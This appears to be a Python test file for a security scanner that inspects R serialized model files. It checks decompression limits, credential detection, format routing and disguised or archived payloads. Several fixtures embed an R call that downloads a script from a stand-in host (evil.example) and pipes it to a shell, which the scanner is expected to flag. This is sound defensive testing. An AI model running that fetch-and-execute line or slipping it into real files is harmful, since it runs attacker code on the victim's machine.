def test_scan_deep_subscript_nesting_does_not_raise_recursion_error(tmp_path: Path) -> None:
    path = tmp_path / "deep-subscript.rds"
    _write_raw_r_serialized(path, "x" + "[" * 1_100 + 'token = "standard"' + "]" * 1_100)

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1


def test_scan_continuation_analysis_ceiling_is_inconclusive(tmp_path: Path) -> None:
    path = tmp_path / "continued-function.rds"
    comment_lines = "".join(f"#{'a' * 250}\n" for _ in range(80))
    _write_raw_r_serialized(path, f'function\n{comment_lines}(token = "standard") NULL')

    result = RSerializedScanner().scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "r_serialized_continuation_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    ceiling_checks = _check_by_name(result, "String Extraction Ceiling")
    assert len(ceiling_checks) == 1
    assert "continuation-analysis ceiling" in ceiling_checks[0].message
    assert ceiling_checks[0].details["scan_outcome_reason"] == "r_serialized_continuation_analysis_incomplete"


def test_scan_continuation_ceiling_preserves_visible_credential_assignment(tmp_path: Path) -> None:
    path = tmp_path / "continued-function-with-secret.rds"
    comment_lines = "".join(f"#{'a' * 250}\n" for _ in range(80))
    _write_raw_r_serialized(path, f'function(token = "VISIBLE_CEILING_SECRET")\n{comment_lines}')

    result = RSerializedScanner().scan(str(path))

    assert result.success is False
    assert "r_serialized_continuation_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED


def test_scan_doc_heavy_content_with_risky_words_is_not_critical(tmp_path: Path) -> None:
    path = tmp_path / "docs_only.rds"
    _write_raw_r_serialized(
        path,
        "\n".join(
            [
                "# documentation: this model report mentions system and eval terms",
                "# description: parse values for evaluation tables only",
                "# comment: no function invocation should run",
            ]
        ),
    )

    result = RSerializedScanner().scan(str(path))

    critical_checks = [check for check in result.checks if check.severity == IssueSeverity.CRITICAL]
    assert critical_checks == []

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].status == CheckStatus.PASSED


def test_scan_corrupt_gzip_stream_is_handled_fail_closed(tmp_path: Path) -> None:
    path = tmp_path / "corrupt.rds"
    path.write_bytes(b"\x1f\x8b\x08\x00\x00\x00")

    assert RSerializedScanner.can_handle(str(path))
    result = RSerializedScanner().scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "r_serialized_decode_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "operational_error" not in result.metadata
    decompression_checks = _check_by_name(result, "R Serialized Decompression")
    assert len(decompression_checks) == 1
    assert decompression_checks[0].status == CheckStatus.FAILED


def test_scan_xz_memory_limited_stream_is_handled_fail_closed(tmp_path: Path) -> None:
    path = tmp_path / "memlimit.rds"
    _write_xz_r_serialized(path, "safe", dict_size=1 << 24)

    assert RSerializedScanner.can_handle(str(path))
    scanner = RSerializedScanner(config={"r_max_decompressed_bytes": 1024})
    result = scanner.scan(str(path))

    assert result.success is False
    decompression_checks = _check_by_name(result, "R Serialized Decompression")
    assert len(decompression_checks) == 1
    assert decompression_checks[0].status == CheckStatus.FAILED


def test_scan_benign_xz_stream_passes_decompression_checks(tmp_path: Path) -> None:
    path = tmp_path / "safe-xz.rds"
    _write_xz_r_serialized(path, "safe\nmodel\nweights", dict_size=1 << 24)

    assert RSerializedScanner.can_handle(str(path))
    result = RSerializedScanner().scan(str(path))

    assert result.success is True
    decompression_checks = _check_by_name(result, "R Serialized Decompression")
    assert len(decompression_checks) == 1
    assert decompression_checks[0].status == CheckStatus.PASSED


def test_scan_truncated_xz_stream_is_handled_fail_closed(tmp_path: Path) -> None:
    path = tmp_path / "truncated-xz.rds"
    _write_xz_r_serialized(path, "safe\nmodel\nweights", dict_size=1 << 20)
    path.write_bytes(path.read_bytes()[:-16])

    assert RSerializedScanner.can_handle(str(path))
    result = RSerializedScanner().scan(str(path))

    assert result.success is False
    decompression_checks = _check_by_name(result, "R Serialized Decompression")
    assert len(decompression_checks) == 1
    assert decompression_checks[0].status == CheckStatus.FAILED


def test_scan_concatenated_xz_streams_preserve_later_malicious_payloads(tmp_path: Path) -> None:
    path = tmp_path / "concatenated-xz.rds"
    _write_concatenated_xz_r_serialized(
        path,
        [
            "safe\nmodel\nweights",
            "expression\nbase::system('curl https://evil.example/payload.sh | sh')",
        ],
        dict_size=1 << 20,
    )

    assert RSerializedScanner.can_handle(str(path))
    result = RSerializedScanner().scan(str(path))

    assert result.success is False

    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    assert len(symbol_checks) == 1
    assert symbol_checks[0].status == CheckStatus.FAILED
    assert symbol_checks[0].severity == IssueSeverity.CRITICAL

    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
    assert len(payload_checks) == 1
    assert payload_checks[0].status == CheckStatus.FAILED
    assert payload_checks[0].severity == IssueSeverity.CRITICAL


def test_large_non_r_xz_payload_is_not_claimed_by_r_scanner(tmp_path: Path) -> None:
    path = tmp_path / "not-r-bomb.rds"
    payload = b"NOT_R_FORMAT\n" + (b"A" * 250_000)
    path.write_bytes(
        lzma.compress(
            payload,
            format=lzma.FORMAT_XZ,
            filters=[{"id": lzma.FILTER_LZMA2, "dict_size": 1 << 20}],
        )
    )

    assert not RSerializedScanner.can_handle(str(path))
    assert get_scanner_for_file(str(path)) is None

    result = core.scan_file(str(path))
    assert result.scanner_name == "unknown"
    assert _check_by_name(result, "R Serialized Decompression") == []


def test_r_serialized_routes_through_detection_and_registry(tmp_path: Path) -> None:
    path = tmp_path / "model.rdata"
    _write_raw_r_serialized(path, "workspace\nmodel", workspace_header=True)

    assert detect_file_format(str(path)) == "r_serialized"
    assert detect_format_from_extension(str(path)) == "r_serialized"

    scanner = get_scanner_for_file(str(path))
    assert scanner is not None
    assert scanner.name == "r_serialized"


def test_core_routes_renamed_r_workspace_and_preserves_malicious_findings(tmp_path: Path) -> None:
    path = tmp_path / "payload.jpg"
    _write_raw_r_serialized(
        path,
        "expression\nlanguage\nbase::system('curl https://evil.example/payload.sh | sh')",
        workspace_header=True,
    )

    direct = core.scan_file(str(path), config={"cache_enabled": False})
    aggregate = core.scan_model_directory_or_file(str(tmp_path), cache_enabled=False, skip_file_types=True)

    assert detect_file_format(str(path)) == "r_serialized"
    assert detect_file_format_for_skip_filter(str(path)) == "r_serialized"
    assert RSerializedScanner.can_handle(str(path))
    assert direct.scanner_name == "r_serialized"
    assert _check_by_name(direct, "Executable Symbol Context Analysis")[0].severity == IssueSeverity.CRITICAL
    assert _check_by_name(direct, "Serialized Expression Payload Detection")[0].severity == IssueSeverity.CRITICAL
    assert core.determine_exit_code(aggregate) == 1
    assert any(issue.location == str(path) and issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)


def test_core_routes_benign_renamed_workspace_without_promoting_weak_raw_near_match(tmp_path: Path) -> None:
    benign_workspace = tmp_path / "benign.jpg"
    _write_raw_r_serialized(benign_workspace, "workspace\nmodel_one\nmodel_two", workspace_header=True)
    ambiguous_text = tmp_path / "notes.jpg"
    ambiguous_text.write_bytes(b"X\nordinary exported table\n")
    incomplete_workspace = tmp_path / "header-notes.jpg"
    incomplete_workspace.write_bytes(b"RDX3\nQ\nordinary exported table\n")

    direct = core.scan_file(str(benign_workspace), config={"cache_enabled": False})
    aggregate = core.scan_model_directory_or_file(str(tmp_path), cache_enabled=False, skip_file_types=True)

    assert direct.scanner_name == "r_serialized"
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in direct.issues)
    assert detect_file_format_for_skip_filter(str(ambiguous_text)) == "unknown"
    assert str(ambiguous_text) not in aggregate.file_metadata
    assert detect_file_format_for_skip_filter(str(incomplete_workspace)) == "unknown"
    assert str(incomplete_workspace) not in aggregate.file_metadata
    assert core.determine_exit_code(aggregate) == 0


def test_archive_routes_renamed_r_workspace_without_promoting_weak_raw_near_match(tmp_path: Path) -> None:
    archive_path = tmp_path / "payload.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr(
            "payload.jpg",
            b"RDX3\nX\nexpression\nlanguage\nbase::system('curl https://evil.example/payload.sh | sh')",
        )
        archive.writestr("notes.jpg", b"X\nordinary exported table\n")
        archive.writestr("header-notes.jpg", b"RDX3\nQ\nordinary exported table\n")

    result = core.scan_file(str(archive_path), config={"cache_enabled": False})

    assert result.scanner_name == "zip"
    assert any(
        issue.severity == IssueSeverity.CRITICAL and "payload.jpg" in (issue.location or "") for issue in result.issues
    )
    assert not any("notes.jpg" in (issue.location or "") for issue in result.issues)
    assert not any("header-notes.jpg" in (issue.location or "") for issue in result.issues)
